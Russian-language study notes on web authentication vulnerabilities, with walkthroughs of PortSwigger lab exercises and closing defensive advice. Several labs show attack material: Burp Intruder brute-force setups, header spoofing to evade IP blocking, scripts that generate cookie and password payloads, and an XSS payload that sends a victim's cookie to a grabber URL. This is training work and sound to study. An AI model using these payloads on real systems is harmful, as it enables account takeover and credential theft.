# Введение

---

## Что такое аутентификация?

**Аутентификация** — это процесс подтверждения личности пользователя или клиента. Веб-сайты потенциально доступны любому, кто подключён к интернету. Это делает надёжные механизмы аутентификации неотъемлемой частью эффективной веб-безопасности.

Существует три основных типа аутентификации:

- Что-то**, что вы знаете**, например, пароль или ответ на вопрос безопасности. Их иногда называют «факторами знаний».
- Что-то, **что у вас есть**, это физический объект, такой как мобильный телефон или токен безопасности. Их иногда называют «факторами владения».
- Что-то, **чем ты есть**, или что ты делаешь. Например, ваши биометрические данные или модели поведения. Их иногда называют «факторами врождённости».

Механизмы аутентификации опираются на ряд технологий для проверки одного или нескольких из этих факторов.

---

## В чём разница между аутентификацией и авторизацией?

Аутентификация — это процесс подтверждения, что пользователь — это тот, за кого он себя выдаёт. Авторизация включает проверку, разрешено ли пользователю что-либо делать.

Например, аутентификация определяет, действительно ли `Carlos123`, пытающийся получить доступ к сайту, тот же человек, который создал аккаунт. 

После аутентификации `Carlos123` его права определяют, что он способен делать. Например, ему может быть разрешено получать доступ к личной информации других пользователей или выполнять действия, например, удаление учетной записи другого пользователя. 

---

## Как возникают уязвимости аутентификации?

Большинство уязвимостей в механизмах аутентификации возникают одним из двух способов:

- Механизмы аутентификации слабы, потому что они недостаточно защищают от  brute-force атак.
- Логические ошибки или плохое программирование в реализации позволяют полностью обойти механизмы аутентификации злоумышленникам. Это иногда называют «сломанной аутентификацией».

---

# HTTP заголовки для обхода блокировок при переборе

#User-Agent #Referer #X-Forwarded-For #X-Forwarded

```http
User-Agent: Браузер/Версия (Платформа; Шифрование; Система, Язык[; Что-нибудь еще]) [Дополнения]
```

```http
Referer: http://example.com/123
```

```http
X-Forwarded-For: client_ip, proxy1_ip, ..., proxyN_ip
```

> [!info] 
> Для динамической подмены значения HTTP заголовка в Burp Intruder необходимо выбрать режим "Pitchfork". 

---

# Успешные входы для обхода блокировок при переборе 

[[Authentication vulnerabilities#Lab Broken brute-force protection, IP block]]

---

# Обход блокировки аккаунта при переборе

1. Составьте список пользователей, которые, скорее всего, будут действительными. Это может происходить через перечисление имён пользователей или просто на основе списка распространённых имён пользователей.
2. Определите очень короткий список паролей, которые, по вашему мнению, будут иметь хотя бы один из пользователей. Главное, что количество выбранных паролей не должно превышать количество разрешённых попыток входа. Например, если вы выяснили, что лимит — 3 попытки, нужно выбрать максимум 3 угадывания пароля.

Блокировка аккаунта также не защищает от атак с использованием доблирующихся учетных данных с других сервисов. Это требует использования огромного словаря пар, состоящего из подлинных учетных данных для входа, украденных при утечках данных. 

---

## Ограничение пользовательской скорости

Ещё один способ, которым сайты пытаются предотвратить атаки грубой силой — это ограничение пользовательской частоты. В этом случае слишком много запросов на вход за короткий промежуток времени приводит к блокировке вашего IP-адреса. Обычно IP можно разблокировать только одним из следующих способов:

- Автоматически спустя определённый период времени
- Ручное управление администратором
- Пользователь делает это вручную после успешного завершения CAPTCHA

Ограничение частоты пользователей иногда предпочтительнее блокировки аккаунта из-за меньшей подверженности перечислению имён пользователей и атакам типа отказ в обслуживании. Однако он всё ещё не полностью защищён. Как мы видели в более ранней лаборатории, злоумышленник может манипулировать своим видимым IP, чтобы обойти блокировку.

Поскольку лимит основан на частоте HTTP-запросов, отправляемых с IP-адреса пользователя, иногда возможно обойти эту защиту, если вы сможете угадать несколько паролей одним запросом.

---

# HTTP basic authentication

Хотя она довольно старая, её относительная простота и простота реализации приводят к тому, что иногда можно увидеть использование basic HTTP-аутентификации. В HTTP-basic аутентификации клиент получает токен аутентификации от сервера, который формируется путём объединения имени пользователя и пароля, а также кодирования в Base64. Этот токен хранится и управляется браузером, который автоматически добавляет его в заголовок `Authorization` каждого последнего запроса следующим образом: 

```
Authorization: Basic base64(username:password)
```

Реализации Basic HTTP-аутентификации часто не поддерживают защиту от brute-force. Поскольку токен состоит исключительно из статических значений, это может сделать его уязвимым к перебору.

Basic аутентификация HTTP также особенно уязвима к эксплойтам, связанным с сессиями, особенно к CSRF, против которых она сама по себе не защищает.

---

# Уязвимости в многофакторной аутентификации

---

## Ошибочная двухфакторная логика верификации

Иногда ошибочная логика при двухфакторной аутентификации приводит к тому, что после завершения начального этапа входа пользователь не проверяет, что тот же пользователь выполняет второй шаг.

Например, пользователь входит в систему с обычными учётными данными на первом шаге следующим образом:

```
POST /login-steps/first HTTP/1.1 
Host: vulnerable-website.com 
...
username=carlos&password=qwerty
```

Затем им назначают куки, связанный с их аккаунтом, после чего переходят ко второму этапу процесса входа:

```
HTTP/1.1 200 OK 
Set-Cookie: account=carlos 

GET /login-steps/second HTTP/1.1 
Cookie: account=carlos
```

При подаче кода подтверждения запрос использует этот файл cookie, чтобы определить, к какой учётной записи пользователь пытается получить доступ:

```
POST /login-steps/second HTTP/1.1 
Host: vulnerable-website.com 
Cookie: account=carlos 
... 
verification-code=123456
```

В этом случае злоумышленник может войти с помощью собственных учетных данных, но затем изменить значение куки `account` на любое произвольное имя пользователя при вводе кода проверки. 

```
POST /login-steps/second HTTP/1.1 
Host: vulnerable-website.com 
Cookie: account=victim-user 
... 
verification-code=123456
```


---

# Сброс пароля через свой аккаунт и подмену на другой аккаунт в процессе сброса

---

# Лабораторные

---

### Lab: Username enumeration via subtly different responses

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

Click on the  **Settings** tab to open the **Settings** side panel. Under **Grep - Extract**, click **Add**. In the dialog that appears, scroll down through the response until you find the error message `Invalid username or password.`

---

### Lab: Username enumeration via response timing

#X-Forwarded-For #X-Forwarded

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-response-timing

Пересылаем login запрос в Intruder с режимом Pitchfork:
```http
POST /login HTTP/2
Host: *.web-security-academy.net
: 1.1.§1§.1
Content-Length: 32

username=§1§&password=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```
> Используем длинный пароль, чтобы задержка во времени была нагляднее.
> 
> Самый долгий ответ у пользователя "`an`". 

Аналогично получаем пароль "`jessica`".

---

### Lab: Broken brute-force protection, IP block

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-broken-bruteforce-protection-ip-block

Замечаем, что каждые 3 неверные попытки блокируют вход. В этой лабораторной можно избежать блокировки, если на 3'ю попытку успешно входить в аккаунт. 

1. Пересылаем login запрос в Intruder с режимом Pitchfork;
   ```http
   POST /login HTTP/2
   Host: *.web-security-academy.net
   
   username=§carlos§&password=§1§
   ```
2. В **Resource pool** выставляем **Maximum concurrent requests** в `1` ;
3. В **Payload** вставляем имена и пароли. Их можно сгенерировать следующим скриптом:
   
   ``` python
	print("#####The following are the usernames:#####")
	for i in range(150):
		if i % 3:
			print("carlos")
		else:
			print("wiener")
	
	print("#####The following are the passwords:#####")
	with open('passwords.txt', 'r') as f:
		lines = f.readlines()
	
	i = 0
	for pwd in lines:
		if i % 3:
			print (pwd.strip('\n'))
		else:
			print("peter")
			print(pwd.strip('\n'))
			i = i+1
		i = i+1
   ```
4. Запускаем перебор.
> Пароль: `pepper`

---
   
### Lab: Username enumeration via account lock

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-account-lock

1. Пересылаем login запрос в Intruder с режимом **Cluster Bomb**;
   ```http
   POST /login HTTP/2
   Host: *.web-security-academy.net
   
   username=§carlos§&password=qwe§1§
   ```
2. Для первой нагрузки используем предоставленный список имён;
3. Для второй выбираем тип "**Null payloads**" и опцию для генерации 5 полезных нагрузок. Это приведёт к повторению каждого имени пользователя 5 раз. Начинайте атаку.
4. В результатах обратите внимание, что ответы на одно из имён пользователя были длиннее, чем на другие имена. Внимательно изучите ответ и заметите, что в нём содержится другое сообщение об ошибке: `You have made too many incorrect login attempts.`. Запишите это имя пользователя:
   > `acceso`.
5. Теперь в режиме  **Sniper attack** переберите предоставленные пароли для найденного пользователя.
6. Включите поиск ошибок в **Settings** -> "**Grep - Match**", добавляем известные нам ошибки: "incorrect" и "Invalid".
7. Замечаем один запрос без ошибок - это нужный пароль:
   > `12345`.
   
---

### Lab: 2FA simple bypass

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-multi-factor-authentication/authentication/multi-factor/lab-2fa-simple-bypass

1. Логин:` carlos`:`montoya`;
2. Открыть главную страницу.

---

### Lab: 2FA broken logic

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-multi-factor-authentication/authentication/multi-factor/lab-2fa-broken-logic

1. Логин: `wiener`:`peter` с вводом 2FA;
2. В истории выделяем 2 запроса после логина: `GET /login2` и `POST /login2`. Здесь можно понять, что после логина в `wiener` мы можем вызывать 2FA для других пользователей, обходя первый фактор - логин:пароль;
3. 2FA от `wiener` не подходит другому пользователю, но его можно подобрать через Intruder.

---

### Lab: Brute-forcing a stay-logged-in cookie

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

1. Логин: `wiener`:`peter` с указанием "Stay logged in";
2. Cookie, сохраняющие сессию уязвимы - это base64;
   > Декодированный вид: `wiener:51dc30ddc473d43a6011e9ebba6ca770`
   > Пароль здесь - `MD5`.
3. Создадим список токенов для `carlos`:
	```python
	import hashlib
	import base64
	
	INPUT_FILE = "passwords.txt"
	
	def md5_hex(text: str) -> str:
		return hashlib.md5(text.encode("utf-8")).hexdigest()
	
	def main():
		with open(INPUT_FILE, "r", encoding="utf-8") as f:
			for line in f:
				password = line.strip()
				if not password:
					continue
				md5_hash = md5_hex(password)
				combined = f"carlos:{md5_hash}"
				encoded = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
				print(encoded)
	
	if __name__ == "__main__":
		main()
	```
4. Через Intruder подберём нужные Cookie.

---

### Lab: Offline password cracking

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-offline-password-cracking

1. Оставляем комментарий с нагрузкой (вставить свой Collaborator):
   
   ``` js
   <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
   ```
2. Получаем cookie: `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`
3. Декод base64: `carlos:26323c16d5f4dabff3bb136f2460a943`
4. Используем [CrackStation - Online Password Hash Cracking.](https://crackstation.net/)
   > Пароль: `onceuponatime`.
   5. Удаляем аккаунт.

---

### Lab: Password reset broken logic

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-broken-logic

1. Fogot password: wiener;
2. Переходим по полученной ссылке, вписываем новый пароль и включаем Intercept;
3. Меняем имя пользователя в POST данных:
   ```
   temp-forgot-password-token=...&username=carlos&new-password-1=123&new-password-2=123
   ```
   4. Заходим в аккаунт `carlos` под новым паролем `123`.

---

### Lab: Password reset poisoning via middleware

#X-Forwarded-Host #X-Forwarded

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

Ссылка с уникальным токеном сброса отправляется по электронной почте. Выделим этот запрос:

``` http
POST /forgot-password HTTP/2
Host: 0af6002d04aad82580bc17fa009300ad.web-security-academy.net
Content-Length: 15

username=wiener
```

Здесь с помощью заголовка `X-Forwarded-Host` с указанием URL colloborator'а можно заставить сервер переслать ответный запрос на адрес из `X-Forwarded-Host`.

```http
POST /forgot-password HTTP/2
Host: 0af6002d04aad82580bc17fa009300ad.web-security-academy.net
X-Forwarded-Host: *.oastify.com
Content-Length: 15

username=carlos
```

Таким образом мы получаем ссылку для сброса пароля `carlos`.

---

### Lab: Password brute-force via password change

https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-brute-force-via-password-change

1. Обратите внимание на поведение, когда вы вводите **неправильный текущий пароль**. 
	1. Если две записи для нового пароля совпадают, аккаунт блокируется. 
	2. Eсли ввести два разных новых пароля, просто появляется сообщение `Current password is incorrect`. 
2. Если вы вводите **действующий текущий пароль**, но два новых пароля не совпадают, сообщение говорит `New passwords do not match`. 
3. При перечислении пароля получаем: `cheese`.

---

# Предотвращение атак на ваши собственные механизмы аутентификации

1. Не раскрывайте невольно корректный набор учетных данных для входа.
2. Никогда не отправляйте данные для входа по незашифрованным соединениям. 
   > Хотя вы могли реализовать HTTPS для ваших запросов на вход, убедитесь, что вы обеспечиваете это, перенаправляя все попытки HTTP-запросов на HTTPS.
3. Вам также следует провести аудит вашего сайта, чтобы убедиться, что ни одно имя пользователя или адреса электронной почты не раскрываются ни через общедоступные профили, ни в HTTP-ответах, например.
4. Внедрение эффективной политики паролей. 
   > Популярным примером является библиотека JavaScript `zxcvbn`, разработанная компанией Dropbox. Разрешая только те пароли, которые высоко оцениваются проверяющим паролем, вы можете эффективнее обеспечивать использование защищённых паролей, чем традиционные политики. 
5. Предотвращение перечисления имён пользователя.
6. Реализовать надёжную защиту от грубой силы.
   > Одним из наиболее эффективных методов является внедрение строгого ограничения пользовательских запросов на основе IP. Это должно включать меры, направленные на предотвращение манипуляций злоумышленниками их предполагаемым IP-адресом. В идеале следует требовать, чтобы пользователь прошёл тест CAPTCHA при каждой попытке входа после достижения определённого лимита.
7. Трижды проверьте логику верификации.
8. Не забывайте о дополнительной функциональности.
   > Не зацикливайтесь только на центральных страницах входа и не забывайте о дополнительных функциях, связанных с аутентификацией. Это особенно важно в случаях, когда злоумышленник может зарегистрировать свой аккаунт и исследовать эту функциональность. Помните, что сброс или изменение пароля — это столь же допустимая поверхность атаки, как и основной механизм входа, и, следовательно, должен быть столь же надёжным.
9. Реализовать правильную многофакторную аутентификацию. 
   > Хотя многофакторная аутентификация может быть непрактична для каждого сайта, при правильном выполнении она гораздо безопаснее, чем только по паролю. Помните, что проверка нескольких экземпляров одного и того же фактора не является настоящей многофакторной аутентификацией. Отправка кодов подтверждения по электронной почте — это, по сути, более длинная форма однофакторной аутентификации.
   > 
   > SMS-основанный 2FA технически проверяет два фактора (то, что вы знаете, и то, что у вас есть). Однако, например, возможность злоупотреблений при замене SIM-карт означает, что эта система может быть ненадёжной.
   > 
   > В идеале 2FA должна реализоваться с помощью выделенного устройства или приложения, которое генерирует код проверки напрямую. Поскольку они специально созданы для обеспечения безопасности, они обычно более безопасны.
   > 
   > Наконец, как и с основной логикой аутентификации, убедитесь, что логика в ваших проверках 2FA надёжна, чтобы её нельзя было легко обойти.